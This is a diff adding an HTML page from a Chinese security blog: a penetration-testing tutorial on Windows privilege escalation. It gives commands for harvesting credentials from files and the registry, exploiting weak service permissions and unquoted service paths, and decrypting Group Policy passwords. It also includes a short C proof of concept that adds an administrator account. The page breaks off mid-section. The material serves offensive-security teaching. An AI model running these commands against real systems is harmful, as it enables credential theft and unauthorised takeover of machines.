@@ -1,0 +1,1319 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back(-1);
+                <!--window.location.href='https://kevien.github.io'-->;
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="基本系统信息枚举 在我们提权之前我们首先需要对这个系统需要有一定的了解，比如我们需要知道当前用户有哪些权限、系统打了哪些补丁等。123456789101112131415161718192021222324252627282930313233# Basicssysteminfohostname# Who am I?whoamiecho %username%# What users/localgro">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows权限提升(二)">
+<meta property="og:url" content="http://kevien.github.io/2017/10/01/windows权限提升(二)/index.html">
+<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:description" content="基本系统信息枚举 在我们提权之前我们首先需要对这个系统需要有一定的了解，比如我们需要知道当前用户有哪些权限、系统打了哪些补丁等。123456789101112131415161718192021222324252627282930313233# Basicssysteminfohostname# Who am I?whoamiecho %username%# What users/localgro">
+<meta property="og:image" content="http://kevien.github.io/2017/10/01/windows权限提升(二)/wmic.png">
+<meta property="og:updated_time" content="2018-11-26T09:15:55.196Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="windows权限提升(二)">
+<meta name="twitter:description" content="基本系统信息枚举 在我们提权之前我们首先需要对这个系统需要有一定的了解，比如我们需要知道当前用户有哪些权限、系统打了哪些补丁等。123456789101112131415161718192021222324252627282930313233# Basicssysteminfohostname# Who am I?whoamiecho %username%# What users/localgro">
+<meta name="twitter:image" content="http://kevien.github.io/2017/10/01/windows权限提升(二)/wmic.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://kevien.github.io/2017/10/01/windows权限提升(二)/"/>
+
+
+
+
+
+  <title>windows权限提升(二) | M0rk's Blog</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M0rk's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/10/01/windows权限提升(二)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                windows权限提升(二)
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-01T11:39:24+08:00">
+                2017-10-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2><ul>
+<li>在我们提权之前我们首先需要对这个系统需要有一定的了解，比如我们需要知道当前用户有哪些权限、系统打了哪些补丁等。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"># Basics</div><div class="line">systeminfo</div><div class="line">hostname</div><div class="line"></div><div class="line"># Who am I?</div><div class="line">whoami</div><div class="line">echo %username%</div><div class="line"></div><div class="line"># What users/localgroups are on the machine?</div><div class="line">net users</div><div class="line">net localgroups</div><div class="line"></div><div class="line"># More info about a specific user. Check if user has privileges.</div><div class="line">net user user1</div><div class="line"></div><div class="line"># View Domain Groups</div><div class="line">net group /domain</div><div class="line"></div><div class="line"># View Members of Domain Group</div><div class="line">net group /domain &lt;Group Name&gt;</div><div class="line"></div><div class="line"># Firewall</div><div class="line">netsh firewall show state</div><div class="line">netsh firewall show config</div><div class="line"></div><div class="line"># Network</div><div class="line">ipconfig /all</div><div class="line">route print</div><div class="line">arp -A</div><div class="line"></div><div class="line"># How well patched is the system?</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; - to find specific KBs</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="明文密码存储"><a href="#明文密码存储" class="headerlink" title="明文密码存储"></a>明文密码存储</h2><h3 id="通过以下的命令进行查找"><a href="#通过以下的命令进行查找" class="headerlink" title="通过以下的命令进行查找"></a>通过以下的命令进行查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">findstr /si password *.txt</div><div class="line">findstr /si password *.xml</div><div class="line">findstr /si password *.ini</div><div class="line"></div><div class="line">#Find all those strings in config files.</div><div class="line">dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Find all passwords in all files.</div><div class="line">findstr /spin &quot;password&quot; *.*</div><div class="line">findstr /spin &quot;password&quot; *.*</div></pre></td></tr></table></figure>
+<h3 id="关键文件查找"><a href="#关键文件查找" class="headerlink" title="关键文件查找"></a>关键文件查找</h3><ul>
+<li>在这些常见的文件中查找，其中有些可能是base64编码的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">c:\unattend.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div><div class="line"></div><div class="line">dir c:\*vnc.ini /s /b</div><div class="line">dir c:\*ultravnc.ini /s /b </div><div class="line">dir c:\ /s /b | findstr /si *vnc.ini</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"># VNC</div><div class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</div><div class="line"></div><div class="line"># Windows autologin</div><div class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</div><div class="line"></div><div class="line"># SNMP Paramters</div><div class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</div><div class="line"></div><div class="line"># Putty</div><div class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</div><div class="line"></div><div class="line"># Search for password in registry</div><div class="line">reg query HKLM /f password /t REG_SZ /s</div><div class="line">reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure>
+<h2 id="仅对内网提供的服务"><a href="#仅对内网提供的服务" class="headerlink" title="仅对内网提供的服务"></a>仅对内网提供的服务</h2><ul>
+<li><p>有时候一些服务只是允许内网用户访问，例如一个mysql服务器为了安全不允许外部进行连接。此外一些拥有高权限的程序往往也是针对内网的网络或者机器。例如打印机接口等。这些服务服务往往是很脆弱的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ano</div></pre></td></tr></table></figure>
+</li>
+<li><p>可能输出如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Proto  Local address      Remote address     State        User  Inode  PID/Program name</div><div class="line">    -----  -------------      --------------     -----        ----  -----  ----------------</div><div class="line">    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -</div><div class="line">    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -</div><div class="line">    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -</div><div class="line">    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -</div><div class="line">    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -</div><div class="line">    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -</div></pre></td></tr></table></figure>
+</li>
+<li><p>注意监听的端口，对比一下你从外网扫描到的结果，这里面有没有是你外网访问不到的？</p>
+</li>
+<li><p>如果是这样的，你可以通过端口转发来连接它。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># Port forward using plink</div><div class="line">plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080</div><div class="line"></div><div class="line"># Port forward using meterpreter</div><div class="line">portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;</div><div class="line">portfwd add -l 3306 -p 3306 -r 192.168.1.101</div></pre></td></tr></table></figure>
+</li>
+<li><p>那么我们怎么解释netstat命令的输出呢？</p>
+<h4 id="本地地址-0-0-0-0"><a href="#本地地址-0-0-0-0" class="headerlink" title="本地地址 0.0.0.0"></a>本地地址 0.0.0.0</h4></li>
+<li>本地地址0.0.0.0意味着这个服务监听所有的接口，这个意味着你可以所有人都可以连接。<h4 id="本地地址-127-0-0-1"><a href="#本地地址-127-0-0-1" class="headerlink" title="本地地址 127.0.0.1"></a>本地地址 127.0.0.1</h4></li>
+<li>本地地址127.0.0.1意味着只能接受本台pc的连接，不运行任何其它地方的连接。<h4 id="本地地址-192-168-1-9"><a href="#本地地址-192-168-1-9" class="headerlink" title="本地地址 192.168.1.9"></a>本地地址 192.168.1.9</h4></li>
+<li>本地地址192.168.1.9意味着只是监听来自本地网络的连接，所以只有本地的网络可以连接它，外网是不能连接的。<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2></li>
+<li>内核提权应该是我们最后万不得已才使用的方法，因为它往往容易导致系统不稳定或造成其它方面的问题。</li>
+<li>首先来看一下系统的补丁情况<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">systeminfo</div><div class="line"># or</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="python-转换成二进制文件"><a href="#python-转换成二进制文件" class="headerlink" title="python 转换成二进制文件"></a>python 转换成二进制文件</h4><ul>
+<li>如果我们的exploit是用python写的，但是受害机又没有python环境，我们这个时候可以使用pyinstaller或者其它工具将其转换成二进制文件。<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2></li>
+<li><p>我们通过如下的命令查看任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /query /fo LIST /v</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个输出可能会很多，这个时候可以通过使用findstr命令进行一下过滤，我往往是将其粘贴到txt文档中，然后通过linux命令进行查找。虽然不是很优雅，但是能解决<br>问题，你也可以修改SYSTEM为其它的高权限用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="脆弱的服务权限"><a href="#脆弱的服务权限" class="headerlink" title="脆弱的服务权限"></a>脆弱的服务权限</h2><ul>
+<li>服务是windows上没有图形化界面运行在后台的程序。</li>
+<li>如果你发现一个服务允许everyone写，那么你可以将你的二进制文件写到这个目录并让它去执行。</li>
+<li><p>首先我们可以使用wmic或者sc.exe去发现服务，wmic并不是每台windows机器上都有，且有可能对你当前的用户不可用，如果你用不了它，你可以使用sc.exe</p>
+<h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个命令将会输出当前机器所运行的服务，这个时候我们需要找到这些有权限漏洞的服务，为了检查权限问题我们可以使用icacls这个命令，注意这个命令从vista才开始支持，xp或者以下用的是cacls命令。</p>
+</li>
+<li>如下的命令用于查看运行文件在非system32目录下的服务，并且使用icacls查看对应的权限。前提是你能够使用wmic，且你在c:\windows\temp目录有些权限。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for /f &quot;tokens=2 delims=&apos;=&apos;&quot; %a in (&apos;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&apos;) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt</div><div class="line"></div><div class="line">for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2017/10/01/windows权限提升(二)/wmic.png" alt=""></p>
+<ul>
+<li><p>system32目录被排除了，因为他们大多是正确的，一般都是系统创建的。</p>
+<h3 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sc query state= all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt</div><div class="line"></div><div class="line">FOR /F %i in (Servicenames.txt) DO echo %i</div><div class="line">type Servicenames.txt</div><div class="line"></div><div class="line">FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt</div><div class="line"></div><div class="line">FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt</div></pre></td></tr></table></figure>
+</li>
+<li><p>现在你就可以使用cacls命令来逐个查看每个文件权限了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cacls &quot;C:\path\to\file.exe&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="查看脆弱点"><a href="#查看脆弱点" class="headerlink" title="查看脆弱点"></a>查看脆弱点</h3><ul>
+<li><p>我们需要关注的是用户安装的二进制文件，而不是系统自带的，而且我们想要找的是这样权限的 BUILTIN\Users:(F) ，就是内建用户拥有所有权限的，或者是user/usergroup有F或者C权限的。<br>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\path\to\file.exe </div><div class="line">BUILTIN\Users:F</div><div class="line">BUILTIN\Power Users:C </div><div class="line">BUILTIN\Administrators:F </div><div class="line">NT AUTHORITY\SYSTEM:F</div></pre></td></tr></table></figure>
+</li>
+<li><p>这就意味着你当前用户拥有写权限，这个时候你可以重命名这个exe程序，然后将你的恶意程序放在这个目录下。然后重启这个程序，你的恶意程序就会被执行。这个恶意程序可以使用msfvenom来实现反弹shell或者获取最高权限。</p>
+</li>
+<li><p>下面的poc用于创建一个管理员组的用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main ()</div><div class="line">&#123;</div><div class="line">int i;</div><div class="line">    i = system(&quot;net localgroup administrators theusername /add&quot;);</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>然后我们可以使用mingw编译它</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><ul>
+<li>现在我们需要重启服务来让我们的“恶意”程序得以执行，我们可以使用wmic命令或者net命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service NAMEOFSERVICE call startservice</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net stop [service name] &amp;&amp; net start [service name].</div></pre></td></tr></table></figure>
+<ul>
+<li>这个时候你的二进制文件就会以system或者以管理员上下文进行执行。<h3 id="移植你的meterpreter-shell"><a href="#移植你的meterpreter-shell" class="headerlink" title="移植你的meterpreter shell"></a>移植你的meterpreter shell</h3></li>
+<li>如果你的meterpreter 会话不稳定这个时候你可以迁移到一个稳定的服务上，例如移植到winlogon这个服务上，这个服务是以system权限运行的，且一般是一直运行的。我们可以使用如下的命令查看winlogon的PID<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process list brief | find &quot;winlogon&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这个是有可以使用 migrate pid 进行转移。</p>
+<h3 id="有空格的服务路径"><a href="#有空格的服务路径" class="headerlink" title="有空格的服务路径"></a>有空格的服务路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Using WMIC</div><div class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</div><div class="line"></div><div class="line"># Using sc</div><div class="line">sc query</div><div class="line">sc qc service name</div><div class="line"></div><div class="line"># Look for Binary_path_name and see if it is unquoted.</div></pre></td></tr></table></figure>
+<ul>
+<li>如果路径包含了空格且没有被双引号闭合，那么这个服务是容易受攻击的。<h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4></li>
+<li><p>如果可执行文件的路径是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c:\Program Files\something\winamp.exe</div></pre></td></tr></table></figure>
+</li>
+<li><p>我们可以放如下的程序在这里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c:\program.exe</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>当服务重启的时候将会执行program.exe,我们可以利用任何有空格的目录，不仅仅是program files目录。</p>
+<ul>
+<li>更多的攻击技巧可以看这里：<br><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">http://toshellandback.com/2015/11/24/ms-priv-esc/</a><br>metasploit 也有这个模块  exploit/windows/local/trusted_service_path<h2 id="脆弱的驱动"><a href="#脆弱的驱动" class="headerlink" title="脆弱的驱动"></a>脆弱的驱动</h2></li>
+<li>一些驱动可能是容易受攻击的，我对这块儿还是不是很擅长。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># List all drivers</div><div class="line">driverquery</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
+<p><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">文章详细</a></p>
+<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><ul>
+<li>如果一个机器是加入域了的，当前用户可以查看系统信息卷，这里可能有敏感的文件。</li>
+<li><p>首先我们需要装载这个卷，为了查找到域控机器的ip地址，我们先看一下环境变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># Output environment-variables</div><div class="line">set</div><div class="line"></div><div class="line"># Look for the following:</div><div class="line">LOGONSERVER=\\NAMEOFSERVER</div><div class="line">USERDNSDOMAIN=WHATEVER.LOCAL</div><div class="line"></div><div class="line"># Look up ip-addres</div><div class="line">nslookup nameofserver.whatever.local</div><div class="line"></div><div class="line"># It will output something like this</div><div class="line">Address:  192.168.1.101</div><div class="line"></div><div class="line"># Now we mount it</div><div class="line">net use z: \\192.168.1.101\SYSVOL</div><div class="line"></div><div class="line"># And enter it</div><div class="line">z:</div><div class="line"></div><div class="line"># Now we search for the groups.xml file</div><div class="line">dir Groups.xml /s</div></pre></td></tr></table></figure>
+</li>
+<li><p>如果发现有password，我们可以使用kali中的工具进行解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gpp-decrypt encryptedpassword</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="从管理员权限到system权限"><a href="#从管理员权限到system权限" class="headerlink" title="从管理员权限到system权限"></a>从管理员权限到system权限</h2><h3 id="xp和xp之前"><a href="#xp和xp之前" class="headerlink" title="xp和xp之前"></a>xp和xp之前</h3><ul>
+<li>如果你是一个有GUI界面的管理员组用户，如果你直接打开cmd.exe的时候，你只是以普通用户运行的这个程序，而当你右键 以管理员身份运行你需要知道管理员密码。<br>你可能不知道，所以这个时候你可以去c:\windows\system32 目录去运行cmd.exe 程序。</li>
+<li><p>我们想要成为system 用户，还需要做一下的工作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">time</div><div class="line"></div><div class="line"># Now we set the time we want the system CMD to start. Probably one minuter after the time.</div><div class="line">at 01:23 /interactive cmd.exe</div></pre></td></tr></table></figure>
+</li>
